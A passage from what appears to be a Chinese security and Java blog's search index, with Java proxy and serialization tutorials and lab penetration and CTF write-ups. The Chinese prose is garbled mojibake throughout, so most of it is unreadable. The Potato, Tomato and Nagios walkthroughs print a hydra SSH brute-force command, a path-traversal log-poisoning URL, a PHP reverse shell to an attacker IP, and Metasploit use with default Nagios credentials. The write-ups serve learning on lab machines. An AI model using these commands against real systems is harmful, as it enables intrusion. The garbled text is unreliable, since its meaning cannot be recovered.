å¿…é¡»é‡å†™çš„æ¥å£ï¼Œå¹¶è¿”å›æ¥å£ public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; Object result = method.invoke(userServiceImp, args); return result; &#125;&#125; æˆ‘ä»¬å‘ç°ä¸å†éœ€è¦ä¸€ä¸ªä¸€ä¸ªå¥—æ¨¡æ¿å¾€ä¸Šå†™äº†ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦å¢æ·»æ–°åŠŸèƒ½ï¼Œåªéœ€è¦è¿™æ ·åšï¼š 1234567891011 // å¿…é¡»é‡å†™çš„æ¥å£ï¼Œå¹¶è¿”å›æ¥å£ public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; log(method.getName()); Object result = method.invoke(userServiceImp, args); return result; &#125; public void log(String name)&#123; System.out.println(&quot;[DEBUG]ä½¿ç”¨äº†&quot;+name+&quot;æ–¹æ³•&quot;); &#125;&#125; è™½ç„¶æˆ‘ä»¬å‰é¢å»å†™ç”Ÿæˆä¸€ä¸ªçš„ä»£ç é‡çœ‹ä¼¼å¾ˆå¤§ï¼Œä½†æ˜¯å®é™…ä¸Šè¿™æ®µä»£ç æ˜¯ä¸€ä¸ªå·¥å…·ç”¨çš„ä»£ç ï¼Œæ˜¯å†™æ­»çš„ã€‚ä¸šåŠ¡ä»£ç ç›¸å½“çš„ç«¯ï¼Œä»å‡ åè¡Œéª¤å‡åˆ°åæ¥è¡Œï¼Œå¹¶ä¸”æˆ‘ä»¬çš„ä»£ç†ç±»ä¸ä¼šéšç€å·¥ç¨‹çš„å˜å¤§è€Œå˜å¤§ï¼Œæˆ‘ä»¬é€šè¿‡åå°„ä¹‹åè·å–äº†ç±»çš„æ–¹æ³• è€Œæºç å½“ä¸­ï¼Œinvokeæ–¹æ³•å®é™…ä¸Šä¹Ÿæ˜¯é€šè¿‡setAccessibleæ¥å®ç°çš„","categories":[],"tags":[]},{"title":"é™æ€ä»£ç†","slug":"é™æ€ä»£ç†","date":"2020-11-09T13:36:53.000Z","updated":"2020-11-17T06:15:20.429Z","comments":true,"path":"2020/11/09/é™æ€ä»£ç†/","link":"","permalink":"http://example.com/2020/11/09/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/","excerpt":"","text":"å¥½ä¹…æ²¡ç”¨äº†éƒ½æœ‰ç‚¹å¿˜äº†ï¼Œç°åœ¨æ¡èµ·æ¥å­¦ä¸€ä¸‹ï¼Œä¹‹åè¿˜æœ‰ç”¨ é™æ€ä»£ç†ç»“åˆå‡ºç§Ÿæˆ¿å­ç†è§£ é€šè¿‡å›¾ç¤ºï¼Œæˆ‘ä»¬åˆ†æä¸€ä¸ªä¾‹å­ï¼š å®¢æˆ·éœ€è¦ç§Ÿä¸€ä¸ªæˆ¿å­ æˆ¿ä¸œéœ€è¦ç§Ÿå‡ºæˆ¿å­ è¿™ä¸ªæ—¶å€™ä¸¤è€…ä¹‹é—´çš„åˆåŒå¾ˆçº¯ç²¹ï¼Œå¦‚æœä¸¤è€…è®¤è¯†ï¼Œå°±ä¸éœ€è¦ä¸­ä»‹ï¼Œç›´æ¥å¯¹æ¥æŠŠæˆ¿å­ç§Ÿå‡ºå»å°±å¾ˆç®€å•å¾ˆå¿«äº†å¯¹å§ï¼Ÿä½†æ˜¯ç°å®å¾€å¾€ä¸æ˜¯è¿™æ ·ï¼Œæ›´å¯èƒ½çš„æ˜¯å¦‚ä¸‹æƒ…å†µï¼š æˆ¿ä¸œå’Œå®¢æˆ·äº’ä¸ç›¸è¯†ï¼Œéœ€è¦ç­¾è®¢å„ç§åˆåŒä¿è¯å¯¹æ–¹ä¸ä¼šåæ‚” ä¸€ä¸ªå®¢æˆ·è‚¯å®šä¸ä¼šåªçœ‹æˆ¿å­ï¼Œä»–éœ€è¦çœ‹å¤šä¸ªæˆ¿å­æ¥é€‰æ‹©è‡ªå·±å¿ƒä»ªçš„æˆ¿å­ æˆ¿ä¸œä¸å¯èƒ½æ—¶æ—¶åˆ»åˆ»éƒ½å®ˆç€æˆ¿å­ï¼Œç­‰ä¸€ä¸ªä¸€ä¸ªçš„å®¢æˆ·ä¸Šé—¨æ¥çœ‹ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç”¨æˆ·çš„éœ€æ±‚å’Œæˆ¿ä¸œçš„å®¢æˆ·éƒ½ç›¸å½“ä¸çº¯ç²¹äº†ï¼Œéœ€è¦ç»è¿‡å¾ˆå¤šæ­¥éª¤æ‰å¯ä»¥è½¬æ¢åˆ°ä½ åœ¨ç°å®ç”Ÿæ´»ä¸­ï¼Œæ­£æ˜¯ç”±äºè¿™ç§æƒ…å†µçš„å‡ºç°ï¼Œæ‰€ä»¥å‡ºç°äº†æˆ¿å±‹ä¸­ä»‹ï¼Œè§£å†³å„ç§å®¢æˆ·çš„æƒ…å†µï¼Œç”±æˆ¿å±‹ä¸­ä»‹æ¥ç»™å®¢æˆ·ä»¬è§£å†³å„ç§é—®é¢˜ï¼Œç»è¿‡ä¸­ä»‹å¤„ç†ï¼ŒåŒæ–¹çš„æƒ…å†µåˆå˜å¾—çº¯ç²¹äº†èµ·æ¥ï¼Œè€Œç¹ççš„äº‹æƒ…äº¤ç»™ä¸­ä»‹æ¥å¤„ç†å³å¯ è€Œä»£ç ä¸€æ ·å¦‚æ­¤ï¼Œè¿™ç§æƒ…å†µçš„å‡ºç°å‡ ä¹å¤„å¤„å¯è§ï¼Œæ¯”å¦‚æˆ‘ä»¬å¯èƒ½éœ€è¦å¤„ç†æ•°æ®åº“ï¼Œä¸­é—´éœ€è¦å¯¹æ•°æ®è¿›è¡Œå„ç§å¤„ç†ï¼Œè¿™ç§æƒ…å†µå°±å’Œä¸Šé¢çš„åˆåŒä¸€æ ·ã€‚ è¯è¯´å›æ¥ï¼Œæˆ‘ä»¬å¦‚ä½•å¤„ç†ç§Ÿæˆ¿å­çš„æƒ…å†µå‘¢ï¼Ÿè¿™é‡Œæˆ‘å†™äº†ä¸€å°æ®µä»£ç æ¥åšå‡ºèŒƒä¾‹ï¼š æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªäº‹æƒ…æŠ½è±¡æˆå››ä¸ªpartï¼š å‡ºç§Ÿæˆ¿å­è¿™ä»¶äº‹æƒ… è°å‡ºç§Ÿï¼Ÿ æˆ¿ä¸œ è°è¦æˆ¿å­ï¼Ÿ å®¢æˆ· è°æ¥å¤„ç†å¤æ‚æƒ…å†µï¼Ÿ ä¸­ä»‹ åˆ†æå®Œä¹‹åæˆ‘ä»¬å¯ä»¥ç€æ‰‹äºä»£ç  å‡ºç§Ÿæˆ¿å­è¿™ä»¶äº‹æƒ…ï¼š 12345package Proxy;public interface Rent &#123; public void rent();&#125; æˆ¿ä¸œ: 12345678package Proxy;public class Host implements Rent&#123; public void rent() &#123; System.out.println(&quot;æˆ¿ä¸œç§Ÿå‡ºæˆ¿å­&quot;); &#125;&#125; ä¸­ä»‹ï¼š 123456789101112131415161718192021222324252627package Proxy;public class MyProxy implements Rent &#123; private Host host; public MyProxy(Host host) &#123; this.host = host; &#125; public void rent() &#123; seeHouse(); host.rent(); takeMoney(); giveMoney(); &#125; public void seeHouse()&#123; System.out.println(&quot;ä¸­ä»‹å¸¦ä½ çœ‹æˆ¿å­&quot;); &#125; public void takeMoney()&#123; System.out.println(&quot;ä¸­ä»‹æ”¶ä½ é’±&quot;); &#125; public void giveMoney()&#123; System.out.println(&quot;ä¸­ä»‹ç»™é’±ç»™æˆ¿ä¸œ&quot;); &#125;&#125; å®¢æˆ·ï¼š 123456789101112package Proxy;import org.junit.Test;public class MyTest &#123; @Test public void test1()&#123; MyProxy proxy = new MyProxy(new Host()); proxy.rent(); &#125;&#125; åœ¨ä¸Šé¢çš„ä¾‹å­å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œé™æ€ä»£ç†å¸®æˆ‘ä»¬å®Œæˆäº†å¦‚ä¸‹äº‹æƒ…ï¼š ä½¿å¾—éœ€è¦å†æ¬¡æ˜ç¡®èµ·æ¥ï¼Œæ— è®ºæ˜¯å®¢æˆ·è¿˜æ˜¯æˆ¿ä¸œï¼Œéœ€æ±‚éƒ½å˜å¾—ç›¸å½“ç®€å• å¤æ‚çš„äº‹æƒ…äº¤ç»™äº†ä¸­ä»‹æ¥åš ä½†æ˜¯æˆ‘ä»¬ä¹Ÿå‘ç°äº†ä¸€ä¸ªç¼ºç‚¹ï¼š æˆ‘ä»¬çš„ä»£ç é‡æ˜æ˜¾æå‡äº†å¾ˆå¤šï¼Œç›¸æ¯”äºç›´æ¥æ·»åŠ åŠŸèƒ½ é™¤æ­¤ä¹‹å¤–ï¼Œå¦‚æœå®¢æˆ·å¾ˆå¤šï¼Œæˆ‘ä»¬ä¸å¾—ä¸æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªä¸ªå®¢æˆ·ï¼Œå·¥ä½œé‡æ›´å¤§äº†ã€‚ ç»“åˆå¢åˆ æ”¹æŸ¥äº‹åŠ¡ç†è§£åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å­¦ä¹ åˆ°äº†ä»£ç†æ¨¡å¼çš„ç¬¬ä¸€ä¸ªå¥½å¤„ï¼Œæ¥ä¸‹çš„ä¾‹å­å°†è¿›ä¸€æ­¥è¡¨éœ²å‡ºä¸Šé¢çš„è®¾è®¡æ¨¡å¼çš„å¥½å¤„ï¼Œå¹¶ä¸”å®ƒä¼šå±•ç°é™æ€ä»£ç†çš„ç¬¬äºŒä¸ªå¥½å¤„ï¼Œæ·»åŠ æ–°åŠŸèƒ½è€Œä¸ä¿®æ”¹åŸæœ‰ä»£ç  å¢åˆ æ”¹æŸ¥äº‹åŠ¡ï¼š 12345678package Proxy2;public interface UserService &#123; public void add(); public void delete(); public void update(); public void query();&#125; ä¸šåŠ¡å®ç°ï¼š 12345678910111213141516171819package Proxy2;public class UserServiceImp implements UserService &#123; public void add() &#123; System.out.println(&quot;å¢æ·»äº†ä¸€ä¸ªæ–°ç”¨æˆ·&quot;); &#125; public void delete() &#123; System.out.println(&quot;åˆ é™¤äº†ä¸€ä¸ªç”¨æˆ·&quot;); &#125; public void update() &#123; System.out.println(&quot;æ›´æ–°äº†ä¸€ä¸ªç”¨æˆ·&quot;); &#125; public void query() &#123; System.out.println(&quot;æŸ¥è¯¢äº†ä¸€ä¸ªç”¨æˆ·&quot;); &#125;&#125; è¿™æ—¶å€™æˆ‘ä»¬çªç„¶æƒ³è¦æ·»åŠ æ–°åŠŸèƒ½ï¼Œæ‰“å°æˆ‘ä»¬ä½¿ç”¨äº†ä»€ä¹ˆåŠŸèƒ½æ”¹æ€ä¹ˆåŠï¼Ÿæˆ‘ä»¬å¾ˆæ˜æ˜¾å¯ä»¥è¿™æ ·åšï¼š 1234public void query() &#123; System.out.println(&quot;ä½¿ç”¨äº†æŸ¥è¯¢åŠŸèƒ½&quot;); System.out.println(&quot;æŸ¥è¯¢äº†ä¸€ä¸ªç”¨æˆ·&quot;); &#125; ä½†æ˜¯å¾ˆæ˜æ˜¾è¿™ç§æ–¹å¼éå¸¸ç¬¨æ‹™ï¼Œå¹¶ä¸”å¦‚æœæ˜¯æ›´å¤šçš„åŠŸèƒ½ï¼Œç¨‹åºå‘˜å°±å¿…é¡»æ‰‹å†™ï¼Œå¹¶ä¸”ä¸€æ®µä¸€æ®µçš„å¤åˆ¶å·®ä¸å¤šçš„ä»£ç ï¼ï¼ˆè¿™é‡Œå››ä¸ªè¾“å‡ºè¯­å¥å°±è®©æˆ‘æ„Ÿè§‰æœ‰ç‚¹çƒ¦èºäº† æˆ‘ä»¬ç»“åˆä»£ç†æ¨¡å¼ï¼Œå…¶å®å¯ä»¥å¾ˆä¼˜é›…çš„è§£å†³å®ƒï¼š 12345678910111213141516171819202122232425262728293031323334package Proxy2;public class UserServiceProxy implements UserService &#123; private UserServiceImp userServiceImp; public void setUserServiceImp(UserServiceImp userServiceImp) &#123; this.userServiceImp = userServiceImp; &#125; public void add() &#123; log(&quot;add&quot;); userServiceImp.add(); &#125; public void delete() &#123; log(&quot;åˆ é™¤&quot;); userServiceImp.delete(); &#125; public void update() &#123; log(&quot;æ›´æ–°&quot;); userServiceImp.update(); &#125; public void query() &#123; log(&quot;æŸ¥è¯¢&quot;); userServiceImp.query(); &#125; public void log(String name)&#123; System.out.println(&quot;[DEBUG]æ‰§è¡Œäº†&quot;+name+&quot;æ–¹æ³•&quot;); &#125;&#125; è¿™æ—¶å€™æˆ‘ä»¬å°±è§£å†³äº†åŠŸèƒ½çš„éœ€æ±‚ï¼Œå¹¶ä¸”ï¼Œæˆ‘ä»¬æ²¡æœ‰ä¿®æ”¹ä»»ä½•ä¸€è¡ŒåŸä»£ç ï¼Œå´ä¸Šçº¿äº†æ–°çš„åŠŸèƒ½ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬çš„ä»£ç æ‹“å±•æ€§ä¾ç„¶å¾ˆé«˜ï¼Œéœ€è¦æ·»åŠ æ–°åŠŸèƒ½åªéœ€è¦æ·»åŠ æ–°çš„ä»£ç†å±‚å³å¯ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°†å¼•å‡ºäº†ç¬¬ä¸‰ä¸ªæ€æƒ³ï¼š ä»»ä½•åŠŸèƒ½çš„æ·»åŠ ï¼Œä¿®æ”¹ï¼Œå¼•å…¥æ–°çš„ä»£ç†å±‚æ¥è§£å†³ï¼Œå®¢æˆ·åªéœ€è¦å»å¯¼å…¥æœ€åä¸€ä¸ªä»£ç†å¢å³å¯","categories":[],"tags":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"}]},{"title":"Potatoå’ŒTomatoæ¸—é€","slug":"Potatoå’ŒTomatoæ¸—é€","date":"2020-11-08T13:00:22.000Z","updated":"2020-12-16T10:57:45.298Z","comments":true,"path":"2020/11/08/Potatoå’ŒTomatoæ¸—é€/","link":"","permalink":"http://example.com/2020/11/08/Potato%E5%92%8CTomato%E6%B8%97%E9%80%8F/","excerpt":"","text":"Potatoæ¸—é€ä¹Ÿæ˜¯ç»å…¸çš„dirbå’Œnmapæ‰«ä¸€æ³¢ nmapçš„ç»“æœ dirbçš„ç»“æœ ä¹Ÿå°±å‘ç°äº†ä¸€ä¸ªinfo.phpèƒ½ç”¨ï¼Œè®¿é—®ä¸€äº›æ˜¯phpinfoï¼Œå‘ƒï¼Œé‚£å†çœ‹çœ‹nmapï¼Œå¼€äº†7120ç«¯å£ï¼Œçœ‹çœ‹ï¼Œå•¥éƒ½æ²¡æœ‰ï¼Œåªèƒ½é€šè¿‡hypdraè¿›è¡Œçˆ†ç ´å’¯ï¼Œå‘ƒï¼Œè´¦å·å¯†ç éƒ½ä¸çŸ¥é“ï¼Œåªèƒ½è¯•è¯•çœ‹äº† 1hydra 192.168.1.113 ssh -s 7120 -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -t 4 -v -f ç™»é™†ä¸Šä¹‹åæŸ¥çœ‹uname -a æŸ¥çœ‹èƒ½ä¸èƒ½ææƒ çœ‹è§å†…æ ¸ä¸ºubuntu3.å¤šï¼Œè¿™ç§è€ç‰ˆæœ¬ä¸€èˆ¬å¯ä»¥ç›´æ¥æï¼Œå°è¯•æœç´¢ 123potato@ubuntu:/tmp$ uname -aLinux ubuntu 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux searchsploit Ubuntu 3.13.0 åˆ©ç”¨-pæŒ‡ä»¤æ‰¾åˆ°å­˜æ”¾ä½ç½®ï¼Œä¹‹åæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ‹¿ä¸‹expäº†ï¼Œå†ä¸Šä¼ åˆ°é¶æœºçš„tmpç›®å½•ä¸‹ï¼ˆå› ä¸ºtmpç›®å½•å¤§éƒ¨åˆ†æƒ…å†µä¸‹æ˜¯777æƒé™ æˆåŠŸæ‹¿ä¸‹ï¼ Tomatoæ¸—é€é¦–å…ˆç»å…¸dribå’Œnmapæ‰«ä¸€æ³¢ nmapï¼š 1nmap -sS -v -T4 -Pn -A -p 0-65535 å‘ç°8888ç«¯å£å’Œ21ï¼Œå¼€äº†å…¶ä»–tcpå’Œsshçš„ç«¯å£,ä½†æ˜¯éƒ½æ²¡æ³•ç”¨ï¼Œåœ¨info.phpä¸‹å‘ç°æ–‡ä»¶åŒ…å« å°è¯•åŒ…å«äº†ä¸€ä¸‹etc/passwdå°±å¡ä½äº†ï¼Œä¸çŸ¥é“è¯¥æ€ä¹ˆåšã€‚ã€‚ è¿™é‡Œè®°å½•ä¸‹å„ä¸ªlogçš„æ–‡ä»¶ 1234567891011121314151617189)/var/run/utmp è®°å½•ç€ç°åœ¨ç™»å½•çš„ç”¨æˆ·;10)/var/log/lastlog è®°å½•æ¯ä¸ªç”¨æˆ·æœ€åçš„ç™»å½•ä¿¡æ¯;11)/var/log/btmp è®°å½•é”™è¯¯çš„ç™»å½•å°è¯•;12)/var/log/dmesgå†…æ ¸æ—¥å¿—;13)/var/log/cpus CPUçš„å¤„ç†ä¿¡æ¯ï¼›14)/var/log/syslog äº‹ä»¶è®°å½•ç›‘æ§ç¨‹åºæ—¥å¿—ï¼›15)/var/log/auth.log ç”¨æˆ·è®¤è¯æ—¥å¿—ï¼›16)/var/log/daemon.log ç³»ç»Ÿè¿›ç¨‹æ—¥å¿—ï¼›17)/var/log/mail.err é‚®ä»¶é”™è¯¯ä¿¡æ¯ï¼›18)/var/log/mail.info é‚®ä»¶ä¿¡æ¯ï¼›19)/var/log/mail.warn é‚®ä»¶è­¦å‘Šä¿¡æ¯ï¼›20)/var/log/daemon.log ç³»ç»Ÿç›‘æ§ç¨‹åºäº§ç”Ÿçš„ä¿¡æ¯;21)/var/log/kern å†…æ ¸äº§ç”Ÿçš„ä¿¡æ¯;22)/var/log/lpr è¡Œæ‰“å°æœºå‡è„±æœºç³»ç»Ÿäº§ç”Ÿçš„ä¿¡æ¯; æ ¹æ®å¤§ä½¬çš„payloadï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œåœ¨å½“å‰ç¯å¢ƒä¸‹æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„logæ–‡ä»¶åªæœ‰auth.log,å› ä¸ºåªæœ‰ä¸ªè¿™ä¸ªæ—¥å¿—æˆ‘ä»¬å¯ä»¥æ“ä½œï¼Œæ¯”å¦‚æˆ‘ä»¬å†™å…¥ä¸€å¥è¯ï¼Œå†è¿›è¡ŒåŒ…å«çš„è¯ï¼Œä¸å°±æ˜¯æ‰§è¡Œäº†å‘½ä»¤äº†å—ï¼ˆè¿™ä¸ªæ€è·¯çœŸçš„éªš æ‰€ä»¥æˆ‘ä»¬é©¬ä¸Šæ“ä½œä¸€æ³¢ï¼Œè¿™é‡Œæˆ‘ç”¨xshellè„¸ä¸ŠÂ·çš„ é©¬ä¸Šæ‰§è¡Œå‘½ä»¤ï¼š 1view-source:http:&#x2F;&#x2F;192.168.29.131&#x2F;antibot_image&#x2F;antibots&#x2F;info.php?image&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth.log&amp;cmd&#x3D;ls å†ä¹‹åä¸ºäº†èƒ½å¤Ÿä¼ è„šæœ¬å•¥çš„å•Šï¼Œæˆ‘ä»¬æ‰§è¡Œä¸€æ³¢åå¼¹shellï¼š 1php -r &#x27;$sock=fsockopen(&quot;192.168.29.129&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; urlencodeä¸€ä¸‹ 1php%20-r%20&#x27;%24sock%3Dfsockopen(%22192.168.29.129%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B&#x27; å¼¹åˆ°è‡ªå·±æœ¬æœºä¸Šå³å¯ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬æ±‚ä¸€ä¸ªäº¤äº’å¼çš„shellï¼Œå‘ç°python3å¯ä»¥ç”¨ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥ç”¨Pythonæ‰“å¼€ä¸€ä¸ªäº¤äº’å¼çš„shell 1python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; ä¹‹åuname -a çœ‹å†…æ ¸ï¼Œexpä¸€å†²å°±å®Œäº‹äº† 1grep -nr &quot;flag&#123;&quot; / 2&gt;/dev/null æˆ‘ä»–å¦ˆç›´æ¥ä¸€æŠŠæ¢­","categories":[],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"Nagiosæ¸—é€","slug":"Nagiosæ¸—é€","date":"2020-11-08T11:38:31.000Z","updated":"2020-11-08T12:44:22.850Z","comments":true,"path":"2020/11/08/Nagiosæ¸—é€/","link":"","permalink":"http://example.com/2020/11/08/Nagios%E6%B8%97%E9%80%8F/","excerpt":"","text":"ç¬¬ä¸€æ­¥ï¼šç»å…¸NMAP 1nmap -sS -v -T4 -Pn -A -p 0-65535 172.192.168.235.135 drib 1dirb http://192.168.29.128/ Nmapçš„ç»“æœå¦‚ä¸‹ï¼š è€Œdirbçš„ç»“æœï¼š æ„Ÿè§‰æœ‰ç‚¹é¸¡è‚‹å•Š..dirbçš„ç»“æœ ç¬¬äºŒæ­¥WTMç›´æ¥ç”¨expåº“ 1searchsploit nagios msfconsole 1search nagios ä¹‹åä½¿ç”¨show optionsæŸ¥çœ‹æˆ‘ä»¬éœ€è¦å¡«å†™ä»€ä¹ˆ æŸ¥çœ‹è¿˜éœ€è¦è®¾ç½®çš„é€‰é¡¹ show optionsï¼Œä¸ºYESä¸”ç©ºçš„å°±æ˜¯è¿˜éœ€è¦æˆ‘ä»¬è®¾ç½®çš„ã€‚ å¯ä»¥çœ‹åˆ°ä¸‹å›¾ä¸­RHOSTå‚æ•°è¿˜æœªè®¾ç½®å†…å®¹ å‘ç°è¿™ä¸ªéœ€è¦è®¾ç½®å¯†ç ï¼Œäºæ˜¯å°è¯•æµ‹è¯•é»˜è®¤å¯†ç ç™»é™†NagiosXIï¼Œåœ¨è¯¥æ–‡ç« ä¸­å¾—åˆ°è´¦å·ä¸ºNagiosAdmin 1https:&#x2F;&#x2F;ywnz.com&#x2F;linuxyffq&#x2F;6587.html å¯†ç ä¸ºadmin è¿™é‡Œè®²ä¸€ä¸‹msfconsoleæ€ä¹ˆç”¨çš„.. msfconsoleé¦–å…ˆsearch æ¼æ´ show options å¯ä»¥æŸ¥çœ‹æœ‰ä»€ä¹ˆæ¡ä»¶æˆ‘ä»¬è¿˜æ²¡æœ‰è®¾ç½® å†ä¹‹åè®¾ç½®rhostå’Œlhostï¼Œå…¶ä¸­rhostä¸ºè¢«æ”»å‡»çš„æœºå­ lhostä¸ºæ”»å‡»æœºï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„kali ä¹‹åç›´æ¥runï¼Œå‘ç°å¤±è´¥ 123] Exploit aborted due to failure: no-access: Authentication failed. Please provide a valid username and password.[*] Exploit completed, but no session was created. äºæ˜¯æŠŠæˆ‘ä»¬åˆšåˆšå¾—åˆ°çš„passwordå¡«å†™ä¸Šå»admin å¾—åˆ°runä¹‹åæ‰§è¡Œshellï¼ŒwhoamiæŸ¥çœ‹æƒé™å°±æ˜¯rootäº†","categories":[],"tags":[]},{"title":"å¤ªæ¹–æ¯easyweb","slug":"å¤ªæ¹–æ¯easyweb","date":"2020-11-07T11:47:54.000Z","updated":"2020-11-17T06:15:31.811Z","comments":true,"path":"2020/11/07/å¤ªæ¹–æ¯easyweb/","link":"","permalink":"http://example.com/2020/11/07/%E5%A4%AA%E6%B9%96%E6%9D%AFeasyweb/","excerpt":"","text":"æ„Ÿè§‰å¤ªæ¹–æ¯çš„é¢˜ç›®éƒ½æŒºéš¾çš„..è¿™æ¬¡è‡ªå·±åˆ¶ä½œå‡ºæ¥ä¸€é“é¢˜ï¼Œæ˜¯ä¸€é“SSTIï¼Œåšçš„æ—¶å€™ä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯nodejsè¿›è¡Œå‘½ä»¤æ‰§è¡Œä»€ä¹ˆçš„ éš¾ç‚¹è¿™é“é¢˜çš„éš¾ç‚¹ä¸»è¦æ˜¯è¿‡æ»¤æ‰äº†èŠ±æ‹¬å·ï¼Œå’ŒåŒå¼•å·ç­‰ã€‚ åšé¢˜æ€è·¯è¿™é“é¢˜åˆçœ‹å°±æ„Ÿè§‰æ˜¯ä¸€é“SSTIï¼Œä½†æ˜¯åˆšå¼€å§‹çš„æ—¶å€™è¢«èŠ±æ‹¬å·å¡ä½äº†ï¼Œæå¾—æˆ‘ä»¥ä¸ºæ˜¯æ˜¯å…¶ä»–é¢˜ç›®ï¼Œç»“æœç›¸å½“æƒ³åˆ°A1CTFç‹¬è§’å…½é‚£é“é¢˜ç›®ï¼Œæ‰æœ‰äº†æ€è·¯ï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥ç¡®å®šçš„æ˜¯ï¼Œæˆ‘ä»¬è¾“å…¥ä¸€äº›èŠ±é‡Œèƒ¡å“¨çš„ä¸œè¥¿ä¼šè¢«è½¬æ¢ä¸ºæ ‡å‡†çš„å­—ç¬¦ä¸²è¾“å‡ºï¼Œå¦‚å›¾ï¼š äºæ˜¯æˆ‘è”æƒ³åˆ°å¯ä»¥é€šè¿‡è¾“å…¥ç±»ä¼¼çš„èŠ±æ‹¬å·çš„utf8ç¼–ç ä¸‹çš„å­—ç¬¦ä¸²è¿›è¡Œç»•è¿‡ï¼š 1https://www.compart.com/en/unicode/U+FE5C å…¶ä¸­è¿™ä¸€è¡Œ UTF-8 Encoding: 0xEF 0xB9 0x9C æˆ‘ä»¬å°†0xä¿®æ”¹ä¸ºç™¾åˆ†å·å³å¯ ä¹‹åå°±æ˜¯æ­£å¸¸çš„SSTIäº†ï¼Œæˆ‘ä»¬å°†ä¸éœ€è¦å¼•å·çš„payloadå¾€ä¸Šä¸Šä¸€ç”©å°±è¡Œäº† äº‹åäº‹åå‘ç°å…¶å®è¿˜å¯ä»¥åˆ©ç”¨è¿™ç§æ–¹å¼è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š","categories":[],"tags":[{"name":"æ¯”èµ›","slug":"æ¯”èµ›","permalink":"http://example.com/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"JavaSerialize","slug":"JavaSerialize","date":"2020-11-02T12:10:22.000Z","updated":"2020-11-03T12:49:27.595Z","comments":true,"path":"2020/11/02/JavaSerialize/","link":"","permalink":"http://example.com/2020/11/02/JavaSerialize/","excerpt":"","text":"JAVAå½“ä¸­å¯¹äºæ–‡ä»¶çš„å¤„ç†éƒ½æ˜¯é€šè¿‡IOæµè¿›è¡Œæ“ä½œçš„ ä¸€äº›IOæµçš„API FileOutputStream å†™å…¥æµï¼Œæˆ‘ä»¬ç”¨è¯¥æµå¯ä»¥å†™å…¥å†…å®¹åˆ°æ–‡ä»¶å½“ä¸­ FileInputStream è¯»å–æµ ObjectOutputStream è¯¥æµå¯ä»¥å°†ä¸€ä¸ªå¯¹è±¡å†™å‡ºï¼Œæˆ–è€…è¯»å–ä¸€ä¸ªå¯¹è±¡åˆ°ç¨‹åºä¸­ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œäº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œã€‚ ObjectInputStream ååºåˆ—åŒ–å¹¶æ‰“å°æ•°æ® JAVAååºåˆ—åŒ–è¿‡ç¨‹é¦–å…ˆæˆ‘ä»¬è¦æ˜ç™½ï¼ŒJavaçš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™å¦‚ä¸‹ä»£ç ï¼š 123456789101112131415161718192021222324import java.io.*;public class demo1&#123; public static void main(String[] args) throws Exception &#123; String obj = &quot;ls &quot;; // å°†åºåˆ—åŒ–å¯¹è±¡å†™å…¥æ–‡ä»¶aa.serä¸­ FileOutputStream fos = new FileOutputStream(&quot;aa.ser&quot;); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(obj); os.close(); // aa.serä¸­è¯»å–æ•°æ® FileInputStream fis = new FileInputStream(&quot;aa.ser&quot;); ObjectInputStream ois = new ObjectInputStream(fis); // é€šè¿‡ååºåˆ—åŒ–æ¢å¤å¯¹è±¡obj,æ³¨æ„è¿™é‡Œä½¿ç”¨å¼ºè½¬ String obj2 = (String)ois.readObject(); System.out.println(obj2); ois.close(); &#125;&#125; é€šè¿‡è¿™ä¸²ä»£ç ï¼Œæˆ‘ä»¬å°†æ•°æ®lsä¼ å…¥åˆ°äº†aa.serå½“ä¸­ï¼Œå¹¶ä¸”å°†å…¶é‡æ–°é‡Šæ”¾äº†å‡ºæ¥ã€‚æˆ‘ä»¬æˆåŠŸé€šè¿‡å†™å…¥åºåˆ—åŒ–æ–‡ä»¶å¹¶å°†å…¶æˆåŠŸè¿”å›ã€‚ å®ç°Serializableå’ŒExternalizableæ¥å£çš„ç±»çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ã€‚æ•…æˆ‘ä»¬å†™ä¸€ä¸ªä¾‹å­ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import java.io.*;import java.text.MessageFormat;public class Demo2 &#123; public static void SerializePerson() throws IOException &#123; Person person = new 